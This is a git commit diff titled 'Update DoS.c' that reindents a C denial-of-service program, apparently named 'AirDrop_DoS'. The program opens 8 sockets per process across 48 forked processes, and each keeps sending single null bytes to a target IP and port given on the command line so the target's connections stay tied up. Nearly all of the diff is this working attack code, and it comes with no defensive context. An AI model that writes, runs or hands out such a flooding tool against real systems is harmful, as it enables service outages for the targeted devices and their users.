1e9e775cb9075dfdcf041ed62b04029c11d1669c
D3fc0nPRE <120033173+D3fc0nPRE@users.noreply.github.com>
2022-12-17 10:16:14 +0545

    Update DoS.c

--- DoS.c
+++ DoS.c
@@ -16,56 +16,55 @@
 
          int make_socket(char *host, char *port) {
          struct addrinfo hints, *servinfo, *p;
-          int sock, r;
-          memset(&hints, 0, sizeof(hints));
+         int sock, r;
+         memset(&hints, 0, sizeof(hints));
  
-           hints.ai_family = AF_UNSPEC;
+          hints.ai_family = AF_UNSPEC;
           hints.ai_socktype = SOCK_STREAM;
           
-          if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+         if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
          fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
-          exit(0);
-    }
+         exit(0);
+       }
          for(p = servinfo; p != NULL; p = p->ai_next) {
-          if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
-          continue;
+         if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+         continue;
         }
              if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
              close(sock);
-              continue;
+             continue;
         }
-        break;
+             break;
     }
-            if(p == NULL) {
+             if(p == NULL) {
              if(servinfo)
              freeaddrinfo(servinfo);
              fprintf(stderr, "No connection could be made\n");
              exit(0);
     }
-          if(servinfo)
-          freeaddrinfo(servinfo);
+         if(servinfo)
+         freeaddrinfo(servinfo);
          fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
          return sock;
 }
-void broke(int s) {
+         void broke(int s) {
 }
-    #define CONNECTIONS 8
+   #define CONNECTIONS 8
    #define THREADS 48
    void attack(char *host, char *port, int id) {
-    int sockets[CONNECTIONS];
-    int x, g=1, r;
-    for(x=0; x!= CONNECTIONS; x++)
-     sockets[x]=0;
-    signal(SIGPIPE, &broke);
-    
-    while(1) {
-     for(x=0; x != CONNECTIONS; x++) {
-     if(sockets[x] == 0)
-     sockets[x] = make_socket(host, port);
-      r=write(sockets[x], "\0", 1);
-      if(r == -1) {
-      close(sockets[x]);
-     sockets[x] = make_socket(host, port);
+   int sockets[CONNECTIONS];
+   int x, g=1, r;
+   for(x=0; x!= CONNECTIONS; x++)
+   sockets[x]=0;
+   signal(SIGPIPE, &broke);
+   while(1) {
+   for(x=0; x != CONNECTIONS; x++) {
+   if(sockets[x] == 0)
+   sockets[x] = make_socket(host, port);
+   r=write(sockets[x], "\0", 1);
+   if(r == -1) {
+   close(sockets[x]);
+   sockets[x] = make_socket(host, port);
             }
         }
         usleep(300000);
@@ -75,12 +74,12 @@ void broke(int s) {
     int x;
     if (argc < 3) {
     printf("Usage: ./AirDrop_DoS <ip-address> <port>\n");
-     exit(-1);
+    exit(-1);
 }
     for(x=0; x != THREADS; x++) {
-     if(fork())
-      attack(argv[1], argv[2], x);
-      usleep(300000);
+    if(fork())
+    attack(argv[1], argv[2], x);
+    usleep(300000);
     }
     getc(stdin);
     return 0;
